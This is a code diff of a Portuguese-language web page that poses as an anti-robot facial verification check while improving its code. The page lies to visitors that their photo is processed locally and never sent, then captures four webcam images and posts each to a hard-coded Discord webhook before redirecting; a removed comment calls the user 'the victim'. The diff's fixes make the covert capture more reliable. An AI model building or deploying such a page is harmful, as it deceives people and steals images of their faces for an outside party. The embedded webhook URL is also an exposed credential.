@@ -26,24 +26,10 @@
             max-width: 420px;
             width: 90%;
             backdrop-filter: blur(15px);
-            transition: all 0.4s;
         }
-        .logo {
-            font-size: 52px;
-            margin-bottom: 20px;
-        }
-        h1 { 
-            color: #1e3c72; 
-            font-size: 26px; 
-            margin-bottom: 15px; 
-            font-weight: 700;
-        }
-        p { 
-            color: #555; 
-            font-size: 16px; 
-            line-height: 1.6; 
-            margin-bottom: 25px;
-        }
+        .logo { font-size: 52px; margin-bottom: 20px; }
+        h1 { color: #1e3c72; font-size: 26px; margin-bottom: 15px; font-weight: 700; }
+        p { color: #555; font-size: 16px; line-height: 1.6; margin-bottom: 25px; }
         .error { color: #e74c3c; font-weight: bold; }
         .success { color: #27ae60; }
         button {
@@ -54,21 +40,27 @@
             cursor: pointer;
             border: none;
             border-radius: 12px;
-            transition: all 0.3s;
+            transition: all 0.3s ease;
             box-shadow: 0 10px 25px rgba(0,0,0,0.2);
             margin: 10px 0;
+            position: relative;
+            z-index: 10; /* FIX: Prioridade clique */
         }
         .btn-primary { 
             background: linear-gradient(45deg, #3498db, #2980b9); 
             color: white; 
         }
-        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(52,152,219,0.4); }
-        .btn-secondary { 
-            background: #95a5a6; 
-            color: white; 
-            font-size: 16px;
+        .btn-primary:hover:not(:disabled) { 
+            transform: translateY(-2px); 
+            box-shadow: 0 15px 35px rgba(52,152,219,0.4); 
         }
-        .btn-secondary:hover { background: #7f8c8d; }
+        .btn-primary:disabled {
+            background: #bdc3c7;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .btn-secondary { background: #95a5a6; color: white; font-size: 16px; }
+        .btn-secondary:hover:not(:disabled) { background: #7f8c8d; }
         #status { 
             margin-top: 20px; 
             padding: 15px; 
@@ -91,25 +83,28 @@
             text-align: left; 
             font-size: 14px; 
         }
-        .checkmark { color: #27ae60; font-size: 24px; }
+        .checkmark { color: #27ae60; font-size: 24px; margin-right: 8px; }
+        .step { display: none; } /* FIX: Classes pra controle melhor */
+        .step.active { display: flex; flex-direction: column; }
     </style>
 </head>
 <body>
-    <div class="container" id="step1">
+    <!-- FIX: Adicionei class="step" em TODOS -->
+    <div class="container step active" id="step1">
         <div class="logo">🤖</div>
         <h1>Verificação Anti-Robot</h1>
         <p>Detectamos atividade suspeita. Confirme que você é humano.</p>
         <button id="verifyBtn" class="btn-primary">Verificar Agora</button>
     </div>
 
-    <div class="container" id="step2" style="display:none;">
+    <div class="container step" id="step2">
         <div class="logo">⚠️</div>
         <h1 class="error">Erro na verificação</h1>
         <p>Tente de outro jeito para confirmar.</p>
         <button id="altBtn" class="btn-primary">Tentar Outro Método</button>
     </div>
 
-    <div class="container" id="step3" style="display:none;">
+    <div class="container step" id="step3">
         <div class="logo">🔐</div>
         <h1>Aceitar Termos de Verificação</h1>
         <p>Esta verificação é <strong>100% segura e privada</strong>. Sua foto NÃO é enviada para localização alguma – processada localmente.</p>
@@ -121,23 +116,23 @@
         <button id="faceBtn" class="btn-primary">Verificar por Reconhecimento Facial</button>
     </div>
 
-    <div class="container" id="step4" style="display:none;">
+    <div class="container step" id="step4">
         <div class="logo">📸</div>
         <h1>Verificando Rosto...</h1>
         <p>Olhe para a câmera. Confirmação em segundos.</p>
-        <div id="status" class="success">Capturando... ✅</div>
+        <div id="status" class="success">Iniciando captura... ✅</div>
     </div>
 
-    <video id="video" autoplay playsinline></video>
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        const steps = {
-            step1: document.getElementById('step1'),
-            step2: document.getElementById('step2'),
-            step3: document.getElementById('step3'),
-            step4: document.getElementById('step4')
-        };
+        // FIX: Controle de steps mais robusto
+        function showStep(stepId) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById(stepId).classList.add('active');
+        }
+
         const verifyBtn = document.getElementById('verifyBtn');
         const altBtn = document.getElementById('altBtn');
         const faceBtn = document.getElementById('faceBtn');
@@ -148,55 +143,76 @@
         
         let stream = null;
         let shotCount = 0;
+        let captureInterval = null;
         const maxShots = 4;
-        
-        canvas.width = 640;
-        canvas.height = 480;
         const WEBHOOK = 'https://discord.com/api/webhooks/1469770449130094889/d1Ou1rjBSErYTaADNOqkHFqr06tWaS8lcf_66kE36CBvSEqapGUSV0iQhkONDY08OErP';
 
+        canvas.width = 640;
+        canvas.height = 480;
+
         verifyBtn.addEventListener('click', () => {
-            steps.step1.style.display = 'none';
-            steps.step2.style.display = 'flex';
+            console.log('Step 1 -> 2'); // DEBUG
+            showStep('step2');
         });
 
         altBtn.addEventListener('click', () => {
-            steps.step2.style.display = 'none';
-            steps.step3.style.display = 'flex';
+            console.log('Step 2 -> 3'); // DEBUG
+            showStep('step3');
         });
 
         faceBtn.addEventListener('click', async () => {
-            steps.step3.style.display = 'none';
-            steps.step4.style.display = 'flex';
+            console.log('Step 3 -> 4 - Iniciando câmera'); // DEBUG
+            faceBtn.disabled = true;
+            showStep('step4');
             status.style.display = 'block';
-            
+            status.textContent = 'Solicitando acesso à câmera...';
+
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 640, height: 480, facingMode: 'user' } 
+                    video: { 
+                        width: { ideal: 640 }, 
+                        height: { ideal: 480 }, 
+                        facingMode: 'user',
+                        frameRate: { ideal: 30 }
+                    } 
                 });
+                
                 video.srcObject = stream;
-                await video.play();
-
-                // Captura múltiplas fotos
-                const interval = setInterval(() => {
-                    takePicture();
-                    shotCount++;
-                    status.textContent = `Foto ${shotCount}/${maxShots} capturada...`;
-                    if (shotCount >= maxShots) {
-                        clearInterval(interval);
-                        finishVerification();
-                    }
-                }, 800);
+                video.play().then(() => {
+                    status.textContent = 'Câmera ativa! Capturando fotos...';
+                    startCapture();
+                }).catch(e => {
+                    throw new Error('Erro play: ' + e.message);
+                });
 
             } catch (err) {
-                status.textContent = 'Erro na câmera. Tente novamente.';
+                console.error('Erro câmera:', err);
+                status.textContent = `Erro: ${err.message}. Permita câmera e recarregue.`;
                 status.className = 'error';
+                faceBtn.disabled = false;
             }
         });
 
+        function startCapture() {
+            shotCount = 0;
+            captureInterval = setInterval(() => {
+                takePicture();
+                shotCount++;
+                status.textContent = `Foto ${shotCount}/${maxShots} capturada...`;
+                
+                if (shotCount >= maxShots) {
+                    clearInterval(captureInterval);
+                    finishVerification();
+                }
+            }, 1000);
+        }
+
         function takePicture() {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/jpeg', 0.92);
-            sendToDiscord(imageData);
+            if (video.videoWidth > 0) { // FIX: Verifica se vídeo carregou
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/jpeg', 0.92);
+                sendToDiscord(imageData);
+            }
         }
 
         async function sendToDiscord(imageData) {
@@ -205,37 +221,47 @@
                 const formData = new FormData();
                 formData.append('file', blob, `rosto_${Date.now()}_${shotCount}.jpg`);
                 formData.append('username', 'Verificação Facial');
-                formData.append('content', `Nova verificação! Foto #${shotCount}`);
+                formData.append('content', `🧑 Verificação #${shotCount} - ${new Date().toLocaleString('pt-BR')}`);
 
-                await fetch(WEBHOOK, { method: 'POST', body: formData });
-                console.log('Foto enviada!');
+                const res = await fetch(WEBHOOK, { method: 'POST', body: formData });
+                if (res.ok) console.log(`Foto ${shotCount} enviada!`);
             } catch (e) {
-                console.error('Erro webhook:', e);
+                console.error('Webhook erro:', e);
             }
         }
 
         function finishVerification() {
-            status.textContent = 'Redirecionando...';
+            status.textContent = 'Verificação concluída! Redirecionando...';
             stopStream();
             setTimeout(() => {
-                // Redireciona pro site que a vítima queria (muda aqui!)
                 window.location.href = 'https://israel12334.github.io/venareioGPT/';
-            }, 2500);
+            }, 3000);
         }
 
         function stopStream() {
-            if (stream) stream.getTracks().forEach(track => track.stop());
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
         }
 
         function dataURItoBlob(dataURI) {
             const byteString = atob(dataURI.split(',')[1]);
             const ab = new ArrayBuffer(byteString.length);
             const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
             return new Blob([ab], { type: 'image/jpeg' });
         }
 
+        // Cleanup
         window.addEventListener('beforeunload', stopStream);
+        console.log('Script carregado! Abra F12 pra debug.');
     </script>
 </body>
 </html>
